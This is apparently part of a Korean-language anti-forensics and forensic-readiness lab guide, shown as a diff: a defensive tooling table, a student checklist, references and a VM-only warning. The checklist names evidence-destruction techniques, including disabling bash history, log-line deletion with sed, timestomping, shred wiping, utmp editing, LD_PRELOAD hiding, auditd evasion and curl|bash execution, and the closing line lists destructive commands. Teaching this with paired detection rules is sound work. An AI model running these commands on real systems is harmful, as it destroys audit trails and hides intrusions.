+| Endpoint | EDR kernel telemetry | Sysmon-Linux, Falco |
+| Endpoint | DEP/ASLR/CFI | sysctl kernel.randomize_va_space=2 |
+| Network | full pcap capability | tcpdump rotate, Stenographer |
+| Network | NetFlow | nfcapd / nfdump |
+| Network | DNS query log | unbound-control |
+| Forensic Tools | memory acquisition | LiME, AVML 사전 빌드 |
+| Forensic Tools | disk imaging | dc3dd, FTK Imager Lite |
+| Forensic Tools | analysis frameworks | Volatility 3, Autopsy, Sleuth Kit |
+| Procedure | IR runbook | NIST SP 800-61 r2 기반 |
+| Procedure | chain of custody | 서명·해시·시간 기록 양식 |
+| Procedure | quarterly drill | mock IR + lessons learned |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: `find /var/log` + `last` + `stat` 출력 모두 보유, 주요 파일 5개 이상 인벤토리
+- [ ] s2: `unset HISTFILE` 또는 `ln -sf /dev/null ~/.bash_history` 실행, auditd 한계 언급
+- [ ] s3: `touch -t` 후 `stat` 비교, `ctime > mtime` 시그니처 설명
+- [ ] s4: `sed -i /pattern/d` 실행, before/after `wc -l` 비교, rsyslog 원격 한계 언급
+- [ ] s5: `curl|bash` + `python3 -c` + `/dev/shm` 3가지 이상 데모, LOLBins 개념
+- [ ] s6: `shred -vfz -n 3` 실행, SSD wear leveling 한계, FDE 권장
+- [ ] s7: `utmpdump` 변환 → 편집 → 역변환, auth.log 교차 검증 언급
+- [ ] s8: LD_PRELOAD 또는 `exec -a` 데모, `/proc` vs `ps` 비교 탐지
+- [ ] s9: `auditctl -l` + 회피 3가지, `-e 2` immutable 방어 언급
+- [ ] s10: LUKS + ext4 저널 + TRIM 3가지, 전원 차단 의미 설명
+- [ ] s11: `macchanger -r eth0` + Tor + NetFlow 한계 언급
+- [ ] s12: Volatility `linux.pslist` + `linux.check_modules` 사용, LiME 또는 AVML 덤프
+- [ ] s13: AIDE/Tripwire/Sleuth Kit 으로 s2~s11 의 흔적 탐지, 5개 이상 detection 룰
+- [ ] s14: 실습 환경 정리 (VM 스냅샷 복원), RoE/IRB 윤리 항목 명시
+- [ ] s15: `/tmp/forensic_readiness.txt` 파일에 5 카테고리 × 4+ 항목, 도구·명령 예시 포함
+- [ ] s99: Bastion 가 5 작업을 plan→execute→synthesize, 5 ATT&CK ID + 각 detection 룰
+
+### 추가 참조 자료
+
+- **NIST SP 800-86** Guide to Integrating Forensic Techniques into IR
+- **NIST SP 800-61 r2** Computer Security Incident Handling Guide
+- **MITRE ATT&CK T1070** (Indicator Removal on Host) 전체 sub-techniques
+- **MITRE ATT&CK T1497** (Virtualization/Sandbox Evasion)
+- **RFC 3227** Guidelines for Evidence Collection and Archiving (휘발성 우선순위)
+- **DoD 5220.22-M** 미 국방부 매체 정화 표준 (3-pass overwrite)
+- **NSA/CSS Storage Device Sanitization Manual** Class I/II/III 분류
+- **Volatility 3 docs**: https://volatility3.readthedocs.io/
+- **Sleuth Kit Wiki**: https://wiki.sleuthkit.org/
+- **AIDE manual**: https://aide.github.io/
+
+위 매트릭스의 모든 명령은 격리된 VM (snapshot 사전 생성) 에서만 실행해야 한다. `auditctl -D`, `tune2fs -O ^has_journal`, `> /var/log/wtmp`, `ln -sf /dev/null ~/.bash_history` 는 운영 시스템에서 절대 실행 금지 — 복구 불가능한 로그 손실을 일으킨다.
